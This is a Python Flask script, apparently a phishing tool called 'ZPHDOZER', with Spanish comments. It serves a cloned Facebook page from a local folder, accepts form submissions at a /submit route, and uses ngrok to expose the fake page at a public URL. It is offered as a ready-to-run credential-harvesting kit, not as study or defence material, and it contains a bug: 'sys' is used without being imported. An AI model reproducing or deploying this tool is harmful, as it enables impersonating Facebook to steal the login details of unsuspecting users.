import os
import uuid
import subprocess
import requests
import threading
import time
from flask import Flask, request, send_from_directory, jsonify

# Configuración de Flask
app = Flask(__name__, static_folder='webs/Facebook', static_url_path='')

@app.route('/')
def index():
    return send_from_directory('webs/Facebook', 'index.html')

@app.route('/<path:filename>')
def serve_static(filename):
    return send_from_directory('webs/Facebook', filename)

@app.route('/submit', methods=['POST'])
def submit():
    data = request.form
    unique_id = generate_unique_id()
    response = {
        'unique_id': unique_id,
        'data': data.to_dict()
    }
    return jsonify(response)

def generate_unique_id():
    return str(uuid.uuid4())

def run_server():
    app.run(host='0.0.0.0', port=5001)

def start_ngrok():
    process = subprocess.Popen(['ngrok', 'http', '5001'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    time.sleep(5)  # Esperar a que ngrok inicie
    try:
        response = requests.get('http://localhost:4040/api/tunnels')
        response.raise_for_status()
        tunnels = response.json().get('tunnels', [])
        public_url = ''
        for tunnel in tunnels:
            if tunnel['proto'] == 'http':
                public_url = tunnel['public_url']
                break
        if not public_url:
            raise ConnectionError("No se encontró una URL pública.")
        return public_url
    except Exception as e:
        print(f"Error al obtener la URL de ngrok: {e}")
        return None

def main():
    unique_id = generate_unique_id()
    banner = '''
   \033[95m  _________  _   _ ____   ___ __________ ____   
    |__  /  _ \| | | |  _ \ / _ \__  / ____|  _ \  
      / /| |_) | |_| | | | | | | |/ /|  _| | |_) | 
     / /_|  __/|  _  | |_| | |_| / /_| |___|  _ <  
    /____|_|   |_| |_|____/ \___/____|_____|_| \_\ 
                                              \033[95m
       '''
    print(banner)

    def mostrar_menu():
        print("\nOpciones:")
        print("1: Iniciar servidor")
        print("2: Salir")

        opcion = input("Elige una opción (1/2): ").strip()

        if opcion == '1':
            server_thread = threading.Thread(target=run_server)
            server_thread.daemon = True
            server_thread.start()
            print("Servidor en ejecución en http://localhost:5001")
            url_ngrok = start_ngrok()
            if url_ngrok:
                print(f"Tu servidor está disponible en: {url_ngrok}")
            else:
                print("No se pudo obtener la URL de ngrok.")
            input("Presiona Enter para salir...")
        elif opcion == '2':
            print("Saliendo...")
            sys.exit()
        else:
            print("Opción inválida. Inténtalo de nuevo.")
            mostrar_menu()

    mostrar_menu()

if __name__ == '__main__':
    main()
